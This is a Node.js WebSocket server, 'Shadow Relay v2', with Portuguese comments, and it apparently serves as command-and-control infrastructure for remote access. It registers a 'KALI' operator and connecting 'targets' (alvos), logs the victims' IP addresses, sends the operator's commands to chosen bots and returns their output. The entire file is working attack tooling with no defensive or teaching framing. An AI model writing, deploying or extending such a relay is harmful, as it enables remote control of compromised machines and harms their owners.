const WebSocket = require('ws');
const http = require('http');

const PORT = process.env.PORT || 10000;
const server = http.createServer((_, r) => r.end('Shadow Relay v2 Online'));
const wss = new WebSocket.Server({ server });

const KALI = new Map(); 
const BOT = new Map();

// Função para gerar logs visíveis no painel do Render
function logger(msg) {
    const agora = new Date().toLocaleString('pt-BR');
    console.log(`[${agora}] ${msg}`);
}

wss.on('connection', (ws, req) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const p = new URLSearchParams(req.url.split('?')[1]);
    const who = p.get('id');

    if (!who) return ws.close(1002);

    if (who === 'KALI') {
        KALI.set(ws, who);
        logger(`[+] OPERADOR CONECTADO: Kali Linux de ${ip}`);
        BOT.forEach((_, id) => ws.send(JSON.stringify({ t: 'bot', s: 'on', id })));
    } else {
        BOT.set(who, ws);
        logger(`[*] ALVO CONECTADO: ${who} [IP: ${ip}]`);
        // Avisa o Kali que um novo alvo entrou
        KALI.forEach((s) => s.send(JSON.stringify({ t: 'bot', s: 'on', id: who })));
    }

    ws.on('message', (data) => {
        try {
            const j = JSON.parse(data);
            if (KALI.has(ws)) { 
                // Kali enviando comando para o bot
                const b = BOT.get(j.to);
                if (b) b.send(j.cmd);
            } else {
                // Bot enviando resposta para o Kali
                const msg = JSON.stringify({ t: 'res', f: who, d: j.out });
                KALI.forEach((s) => s.send(msg));
            }
        } catch (e) { }
    });

    ws.on('close', () => {
        if (KALI.has(ws)) {
            KALI.delete(ws);
            logger(`[-] OPERADOR DESCONECTADO`);
        } else {
            BOT.delete(who);
            logger(`[!] ALVO OFFLINE: ${who}`);
            KALI.forEach((s) => s.send(JSON.stringify({ t: 'bot', s: 'off', id: who })));
        }
    });
});

server.listen(PORT, () => logger(`SERVIDOR ESCUTANDO NA PORTA ${PORT}`));
